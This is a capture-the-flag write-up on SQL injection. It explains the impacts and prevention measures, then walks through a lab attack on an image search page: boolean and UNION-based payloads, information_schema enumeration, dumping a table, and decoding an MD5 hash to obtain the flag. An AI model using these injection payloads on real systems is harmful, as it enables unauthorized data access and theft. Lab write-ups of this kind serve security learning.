# SQLI 1

## SQL Injection impacts

The impact SQL injection can have on a business is far-reaching. A successful attack may result in the unauthorized viewing of user lists, the deletion of entire tables and, in certain cases, the attacker gaining administrative rights to a database

## preventing injection flaws 

Preventing injection requires keeping data separate as far away as possible from commands and queries.

- The preferred option is to use a safe API providing a parameterized interface
- Use positive or “whitelist” server-side input validation that only allows certain values as input
- For needed dynamic queries, escape special characters using the specific escape syntax for that interpreter
- Use LIMIT and other SQL controls within queries to prevent mass disclosure of records in case of SQL injection


## Attack scenario

On search image I tried basic sqli 

> 1 or 1=1

I got all the Images so basically there is sqli in search image page second thing to do

> 1 union select 1

got an error:

> The used SELECT statements have a different number of columns

so I need to add more columns till i got the exact number o columns 

> 1 union select 1,2

the message error is gone, now we need to change 1 with 0 so we display only data we want.

> 0 union select 1,2

Lets deisplay the database namme to do that we can change 1 or 2 with database function

>  0 union select 1,database()
>  
>  ID: 0 UNION select 1,database() 
>  
> First name: 1
> 
> Surname : Member_images

Now we need to find tables and their columns to do so lets try

> 0 UNION select 1,concat(table_name, 111,column_name) from information_schema.columns 

It worked so basically we concat table and column name I added 111 to separate them because we cant put a char or a string
we got alot of rows, lets search for users, we found users table lets display every column on users table

> 0 UNION select 1,concat(id,url,title,comment) from list_images

fifth image got a sus comment lets decrypt it

> If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46


we got albatroz => tolower() => albatroz => sha256 => f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

